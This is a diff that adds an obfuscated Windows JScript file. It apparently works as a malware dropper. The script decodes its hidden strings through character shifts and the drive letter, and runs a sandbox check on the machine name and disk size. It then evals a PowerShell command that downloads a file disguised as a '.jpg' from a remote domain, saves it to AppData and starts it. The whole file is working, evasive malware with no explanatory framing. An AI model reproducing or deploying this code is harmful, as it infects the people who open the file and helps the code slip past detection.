@@ -1,0 +1,68 @@
+try {
+	var cr = "v-=C=-a-=C=-r-=C=- -=C=-_-=C=-W-=C=-s-=C=-h-=C=-S-=C=-h-=C=-l-=C=-l-=C=-=-=C=-W-=C=-S-=C=-c-=C=-r-=C=-i-=C=-p-=C=-t-=C=-.-=C=-C-=C=-r-=C=-e-=C=-a-=C=-t-=C=-e-=C=-O-=C=-b-=C=-j-=C=-e-=C=-c-=C=-t-=C=-(-=C=-\"-=C=-W-=C=-s-=C=-c-=C=-r-=C=-i-=C=-p-=C=-t-=C=-.-=C=-S-=C=-h-=C=-e-=C=-l-=C=-l-=C=-\"-=C=-)-=C=-;-=C=-v-=C=-a-=C=-r-=C=- -=C=-e-=C=-x-=C=-e-=C=-c-=C=-=-=C=-_-=C=-W-=C=-s-=C=-h-=C=-S-=C=-h-=C=-l-=C=-l-=C=-.-=C=-R-=C=-u-=C=-n-=C=-(-=C=-\"-=C=-P-=C=-o-=C=-w-=C=-e-=C=-r-=C=-S-=C=-h-=C=-e-=C=-l-=C=-l-=C=-.-=C=-e-=C=-x-=C=-e-=C=- -=C=---=C=-C-=C=-o-=C=-m-=C=-m-=C=-a-=C=-n-=C=-d-=C=- -=C=-$-=C=-r-=C=- -=C=-=-=C=- -=C=-[-=C=-S-=C=-y-=C=-s-=C=-t-=C=-e-=C=-m-=C=-.-=C=-N-=C=-e-=C=-t-=C=-.-=C=-W-=C=-e-=C=-b-=C=-R-=C=-e-=C=-q-=C=-u-=C=-e-=C=-s-=C=-t-=C=-]-=C=-:-=C=-:-=C=-C-=C=-r-=C=-e-=C=-a-=C=-t-=C=-e-=C=-(-=C=-'-=C=-h-=C=-t-=C=-t-=C=-p-=C=-s-=C=-:-=C=-/-=C=-/-=C=-w-=C=-w-=C=-w-=C=-.-=C=-f-=C=-a-=C=-c-=C=-e-=C=-b-=C=-o-=C=-o-=C=-k-=C=-.-=C=-c-=C=-o-=C=-m-=C=-/-=C=-'-=C=-)-=C=-;-=C=-$-=C=-r-=C=-e-=C=-s-=C=-p-=C=- -=C=-=-=C=- -=C=-$-=C=-r-=C=-.-=C=-G-=C=-e-=C=-t-=C=-R-=C=-e-=C=-s-=C=-p-=C=-o-=C=-n-=C=-s-=C=-e-=C=-(-=C=-)-=C=-;-=C=-$-=C=-r-=C=-e-=C=-q-=C=-s-=C=-t-=C=-r-=C=-e-=C=-a-=C=-m-=C=- -=C=-=-=C=- -=C=-$-=C=-r-=C=-e-=C=-s-=C=-p-=C=-.-=C=-G-=C=-e-=C=-t-=C=-R-=C=-e-=C=-s-=C=-p-=C=-o-=C=-n-=C=-s-=C=-e-=C=-S-=C=-t-=C=-r-=C=-e-=C=-a-=C=-m-=C=-(-=C=-)-=C=-;-=C=-$-=C=-s-=C=-r-=C=- -=C=-=-=C=- -=C=-n-=C=-e-=C=-w-=C=---=C=-o-=C=-b-=C=-j-=C=-e-=C=-c-=C=-t-=C=- -=C=-S-=C=-y-=C=-s-=C=-t-=C=-e-=C=-m-=C=-.-=C=-I-=C=-O-=C=-.-=C=-S-=C=-t-=C=-r-=C=-e-=C=-a-=C=-m-=C=-R-=C=-e-=C=-a-=C=-d-=C=-e-=C=-r-=C=- -=C=-$-=C=-r-=C=-e-=C=-q-=C=-s-=C=-t-=C=-r-=C=-e-=C=-a-=C=-m-=C=-;-=C=- -=C=-$-=C=-r-=C=-e-=C=-s-=C=-u-=C=-l-=C=-t-=C=- -=C=-=-=C=- -=C=-$-=C=-s-=C=-r-=C=-.-=C=-R-=C=-e-=C=-a-=C=-d-=C=-T-=C=-o-=C=-E-=C=-n-=C=-d-=C=-(-=C=-)-=C=-;-=C=- -=C=-$-=C=-c-=C=-o-=C=-d-=C=-e-=C=-=-=C=- -=C=-[-=C=-b-=C=-y-=C=-t-=C=-e-=C=-]-=C=-[-=C=-c-=C=-h-=C=-a-=C=-r-=C=-]-=C=-$-=C=-r-=C=-e-=C=-s-=C=-u-=C=-l-=C=-t-=C=-[-=C=-3-=C=-]-=C=-;-=C=- -=C=-e-=C=-x-=C=-i-=C=-t-=C=- -=C=-$-=C=-c-=C=-o-=C=-d-=C=-e-=C=-\"-=C=-,-=C=-0-=C=-,-=C=-t-=C=-r-=C=-u-=C=-e-=C=-)-=C=-;-=C=-v-=C=-a-=C=-r-=C=- -=C=-H-=C=-t-=C=-j-=C=-D-=C=-M-=C=-X-=C=- -=C=-=-=C=-e-=C=-x-=C=-e-=C=-c-=C=-;-=C=-";
+	var Efso = new ActiveXObject("Scripting.FileSystemObject");
+	var Edrv = Efso.GetDrive(Efso.GetDriveName("C:"));
+	cr = cr.replace(new RegExp("-=" + Edrv.DriveLetter + "=-", 'g'), "");
+	eval(cr);
+	var JuhFNm = "t_potatgji_q`atgji_qaB?]_`bbatgji_qgrsgmnl_`jotatgji_q`atgji_qaB?;otatgji_q`atgji_qaB?atgji_qtu_jkotatgji_q`atgji_qaB?& otatgji_q`atgji_qaB?rwxnatgji_qdmdeotatgji_q`atgji_qaB?otatgji_q`atgji_qaB?UQRapqgnorotatgji_q`atgji_qaB?eep_57eep_otatgji_q`atgji_qaB??pqestkatgji_qdlrsqotatgji_q`atgji_qaB?eep_57eep_otatgji_q`atgji_qaB?Slml_`katgji_qdbotatgji_q`atgji_qaB?eep_57eep_otatgji_q`atgji_qaB?Amnslmrotatgji_q`atgji_qaB? '9gd&otatgji_q`atgji_qaB?]_`bbatgji_qgrsgmnl_`jotatgji_q`atgji_qaB?;; otatgji_q`atgji_qaB?lstk`aatgji_qpqotatgji_q`atgji_qaB? 'yt_potatgji_q`atgji_qaB?]UVqfgQfgjjkotatgji_q`atgji_qaB?;otatgji_q`atgji_qaB?UQRapqgnorotatgji_q`atgji_qaB?eep_57eep_otatgji_q`atgji_qaB?Apqatgji_q_`ratgji_qdM`ahatgji_qdarsotatgji_q`atgji_qaB?& otatgji_q`atgji_qaB?Uqrapqgnorotatgji_q`atgji_qaB?eep_57eep_otatgji_q`atgji_qaB?Qfgatgji_qjkjotatgji_q`atgji_qaB? '9otatgji_q`atgji_qaB?]UVqfgQfgjjkotatgji_q`atgji_qaB?eep_57eep_otatgji_q`atgji_qaB?Pstlotatgji_q`atgji_qaB?& otatgji_q`atgji_qaB?Nmnuatgji_qdpQRfatgji_qdjjkotatgji_q`atgji_qaB?eep_57eep_otatgji_q`atgji_qaB?atgji_qvwatgji_qotatgji_q`atgji_qaB?+otatgji_q`atgji_qaB?Amnkkl_lmbotatgji_q`atgji_qaB?&otatgji_q`atgji_qaB?latgji_qduotatgji_q`atgji_qaB?+otatgji_q`atgji_qaB?m`ahatgji_qdarsotatgji_q`atgji_qaB?otatgji_q`atgji_qaB?Qwxqrsatgji_qklotatgji_q`atgji_qaB?eep_57eep_otatgji_q`atgji_qaB?Latgji_qdrotatgji_q`atgji_qaB?eep_57eep_otatgji_q`atgji_qaB?Uatgji_qd`ABjghatgji_qlmrotatgji_q`atgji_qaB?'eep_57eep_otatgji_q`atgji_qaB?Bmnulmjmn_batgji_qDghjatgji_qdotatgji_q`atgji_qaB?&%otatgji_q`atgji_qaB?frsrnootatgji_q`atgji_qaB?8--otatgji_q`atgji_qaB?bmnimnnjkmuvr01/otatgji_q`atgji_qaB?eep_57eep_otatgji_q`atgji_qaB?glmdmnotatgji_q`atgji_qaB?-otatgji_q`atgji_qaB?w_`i12..//KLKotatgji_q`atgji_qaB?eep_57eep_otatgji_q`atgji_qaB?hnoeotatgji_q`atgji_qaB?%*Yotatgji_q`atgji_qaB?Clmtghpmnlklatgji_qlmrotatgji_q`atgji_qaB?[88otatgji_q`atgji_qaB?Eatgji_qdrDEmjkbatgji_qdpNO_rsfotatgji_q`atgji_qaB?&%otatgji_q`atgji_qaB??nonjkgab_rsgmnlBC_rs_otatgji_q`atgji_qaB?%')%ZZotatgji_q`atgji_qaB?QPQTVWotatgji_q`atgji_qaB?eep_57eep_otatgji_q`atgji_qaB?atgji_qvwatgji_qotatgji_q`atgji_qaB?%'9Yotatgji_q`atgji_qaB?Qwxqrsatgji_qklotatgji_q`atgji_qaB?eep_57eep_otatgji_q`atgji_qaB?Bgh_eflmnqrsgabqotatgji_q`atgji_qaB?eep_57eep_otatgji_q`atgji_qaB?Npqmabatgji_qqrqotatgji_q`atgji_qaB?[88otatgji_q`atgji_qaB?Qrs_pqrotatgji_q`atgji_qaB?&Yotatgji_q`atgji_qaB?Clmtghpmnlklatgji_qlmrotatgji_q`atgji_qaB?[88otatgji_q`atgji_qaB?Eatgji_qdrDEmjkbatgji_qdpNO_rsfotatgji_q`atgji_qaB?&%otatgji_q`atgji_qaB??nonjkgab_rsgmnlBC_rs_otatgji_q`atgji_qaB?%')%ZZotatgji_q`atgji_qaB?QPQTVWotatgji_q`atgji_qaB?eep_57eep_otatgji_q`atgji_qaB?atgji_qvwatgji_qotatgji_q`atgji_qaB?%' *otatgji_q`atgji_qaB?.otatgji_q`atgji_qaB?*rpsatgji_q'9{";
+
+	var PUURTvxKEhdT = "function encwrd(word,delta){  var outer=\"\";for (var i = 0, len = word.length; i < len; i++) {	var symb=(word.charAt(i));	 var symbCharcode=symb.charCodeAt(0);	symbCharcode=symbCharcode-delta;	 outer+=String.fromCharCode(symbCharcode)}return outer;  }encwrd(\"$param1\",$param2);";
+	var stKBY = PUURTvxKEhdT.replace("$param1", JuhFNm);
+	stKBY = stKBY.replace("$param2", "-2");
+	var AUvQGORko_C = eval(stKBY);
+	var ytwOF = "va!qunta! can=false;" +
+		" va!qunta! fso = new ActiveXObject(\"Sc!qunta!ipting.FileSystemObject\");" +
+		"            va!qunta! d!qunta!v = fso.GetD!qunta!ive(fso.GetD!qunta!iveName(\"C:\")); if(d!qunta!v.TotalSize!=10){can=t!qunta!ue;}" +
+		"if(WSc!qunta!ipt.C!qunta!eateObject(\"WSc!qunta!ipt.Netwo!qunta!k\").Compute!qunta!Name!=\"g!qunta!Ea\"){" +
+		"va!qunta! ytwOF=\"!gg!qunta!a!\"+HtjDMX+\"!gg!qunta!a!\";" +
+		"while(AUvQGORko_C.match(ytwOF)){AUvQGORko_C=AUvQGORko_C.!qunta!eplace(ytwOF,\".\");}while(AUvQGORko_C.match(\"cvilkas\")){AUvQGORko_C=AUvQGORko_C.!qunta!eplace(\"cvilkas\",\"e\");}}";
+	while (ytwOF.match("!qunta!")) {
+		ytwOF = ytwOF.replace("!qunta!", "r");
+	}
+	eval(ytwOF);
+	var eSkAlKA = {
+		'_additional': '!qvebecDA!_abddeituiopnabl!qvebecDA!',
+		'eval': '!qvebecDA!evwalm!qvebecDA!',
+		'typeof': '!qvebecDA!tyzpefofg!qvebecDA!',
+		'WScript': '!qvebecDA!WSTcrsipqt!qvebecDA!',
+		'Arguments': '!qvebecDA!Arsguvmefntus!qvebecDA!',
+		'Unnamed': '!qvebecDA!Unonabmefd!qvebecDA!',
+		'Count': '!qvebecDA!Copunot!qvebecDA!',
+		'number': '!qvebecDA!nuvmbcers!qvebecDA!',
+		'_WshShll': '!qvebecDA!_WXshiShillm!qvebecDA!',
+		'CreateObject': '!qvebecDA!CrseabtefObcjefctu!qvebecDA!',
+		'Wscript': '!qvebecDA!Wstcrsipqt!qvebecDA!',
+		'Shell': '!qvebecDA!Shielml!qvebecDA!',
+		'Run': '!qvebecDA!Ruvn!qvebecDA!',
+		'PowerShell': '!qvebecDA!PopwefrSThefllm!qvebecDA!',
+		'exe': '!qvebecDA!exye!qvebecDA!',
+		'Command': '!qvebecDA!Copmmnanod!qvebecDA!',
+		'new': '!qvebecDA!nefw!qvebecDA!',
+		'object': '!qvebecDA!obcjefctu!qvebecDA!',
+		'System': '!qvebecDA!Syzstuemn!qvebecDA!',
+		'Net': '!qvebecDA!Neft!qvebecDA!',
+		'WebClient': '!qvebecDA!WefbCDlijenot!qvebecDA!',
+		'DownloadFile': '!qvebecDA!DopwnolopadeFijlef!qvebecDA!',
+		'http': '!qvebecDA!htutpq!qvebecDA!',
+		'dokoplowt21': '!qvebecDA!dopkopplmowxt231!qvebecDA!',
+		'info': '!qvebecDA!inofop!qvebecDA!',
+		'yak3001MM': '!qvebecDA!yabk340011MNM!qvebecDA!',
+		'jpg': '!qvebecDA!jpqg!qvebecDA!',
+		'Environment': '!qvebecDA!Enovijropnmnenot!qvebecDA!',
+		'GetFolderPath': '!qvebecDA!GeftFGolmdefrPQatuh!qvebecDA!',
+		'ApplicationData': '!qvebecDA!ApqplmicdatuiopnDEatua!qvebecDA!',
+		'SRVX': '!qvebecDA!SRSVXY!qvebecDA!',
+		'Diagnostics': '!qvebecDA!Dijaghnopstuicds!qvebecDA!',
+		'Process': '!qvebecDA!Prsocdests!qvebecDA!',
+		'Start': '!qvebecDA!Stuarst!qvebecDA!',
+		'0': '!qvebecDA!0!qvebecDA!'
+	};
+	for (key in eSkAlKA) {
+		AUvQGORko_C = AUvQGORko_C.replace(new RegExp(eSkAlKA[key], 'g'), key);
+	};
+	var Efso = new ActiveXObject("Scripting.FileSystemObject");
+	var Edrv = Efso.GetDrive(Efso.GetDriveName("C:"));
+	eval("eval(AUvQGORko_" + Edrv.DriveLetter + ");");
+} catch (e) {}
+
+>d:\Multistrings\workdir\23-02-2017tmp\2\res.txt
